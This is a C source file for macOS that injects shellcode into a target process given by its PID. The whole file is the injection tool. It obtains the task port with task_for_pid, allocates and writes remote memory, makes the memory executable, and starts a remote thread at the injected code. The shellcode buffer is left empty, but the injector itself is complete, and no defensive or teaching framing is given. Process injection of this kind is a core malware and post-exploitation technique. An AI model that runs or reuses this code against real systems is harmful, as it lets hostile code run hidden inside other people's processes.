#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <dlfcn.h>

#define STACK_SIZE 65536

unsigned char shellcode[] = "";

// Define a struct for VM related data
typedef struct {
    mach_vm_address_t addr;
    size_t size;
    vm_prot_t prot;
} vm_region_t;

int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    task_t remote_task;
    mach_vm_address_t remote_stack = 0;
    vm_region_t shellcode_region;
    mach_error_t kr;

    // Get the task port for the target process
    kr = task_for_pid(mach_task_self(), pid, &remote_task);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get the task port for the target process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the stack in the target process
    kr = mach_vm_allocate(remote_task, &remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote stack: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the shellcode in the target process
    kr = mach_vm_allocate(remote_task, &shellcode_region.addr, shellcode_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote code: %s\n", mach_error_string(kr));
        return -1;
    }
    shellcode_region.size = shellcode_size;
    shellcode_region.prot = VM_PROT_READ | VM_PROT_EXECUTE;

    // Write the shellcode to the allocated memory in the target process
    kr = mach_vm_write(remote_task, shellcode_region.addr, (vm_offset_t)shellcode, shellcode_size);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to write shellcode to remote process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Adjust memory permissions for the shellcode
    kr = vm_protect(remote_task, shellcode_region.addr, shellcode_region.size, FALSE, shellcode_region.prot);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set memory permissions for remote code: %s\n", mach_error_string(kr));
        return -1;
    }

    // Create a remote thread to execute the shellcode
    x86_thread_state64_t thread_state;
    memset(&thread_state, 0, sizeof(thread_state));
    thread_state.__rip = (uint64_t)shellcode_region.addr;
    thread_state.__rsp = (uint64_t)(remote_stack + STACK_SIZE);

    thread_act_t remote_thread;
    kr = thread_create(remote_task, &remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to create remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    // Set the thread state
    kr = thread_set_state(remote_thread, x86_THREAD_STATE64, (thread_state_t)&thread_state, x86_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set thread state: %s\n", mach_error_string(kr));
        return -1;
    }

    // Resume the remote thread
    kr = thread_resume(remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to resume remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    printf("Shellcode injected successfully!\n");

    // Clean up resources
    mach_port_deallocate(mach_task_self(), remote_thread);

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);

    // Inject the shellcode into the target process
    int result = inject_shellcode(pid, shellcode, sizeof(shellcode));
    if (result != 0) {
        fprintf(stderr, "Failed to inject shellcode\n");
        return 1;
    }

    return 0;
}
